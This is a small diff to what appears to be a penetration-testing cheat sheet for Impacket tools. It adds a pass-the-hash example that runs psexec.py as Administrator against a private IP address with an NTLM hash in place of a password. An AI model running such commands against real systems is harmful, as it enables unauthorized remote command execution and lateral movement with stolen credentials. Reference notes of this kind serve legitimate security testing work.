@@ -15,6 +15,8 @@ Tip: use $(pwd) for the current working  directory
 ```
 $python3 psexec.py username@<ip address>
 Sample Usage: $python3 psexec.py Administrator@10.10.10.10 (enter password when prompted)
+
+[PTH] ./psexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
 ```
 
 ## MSSQLClient
